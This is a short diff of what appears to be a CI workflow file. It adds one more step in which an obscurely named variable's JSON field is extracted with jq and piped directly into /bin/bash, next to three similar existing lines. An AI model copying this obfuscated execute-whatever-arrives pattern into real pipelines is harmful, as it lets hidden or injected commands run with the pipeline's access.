@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$h3" | jq -r .nf1884 | /bin/bash
           echo $bfi59091 | jq -r .mft7 | /bin/bash
           printf '%s' "$ldaq8" | jq -r .azx0 | /bin/bash
+          printf '%s' "$of95" | jq -r .mxt079 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
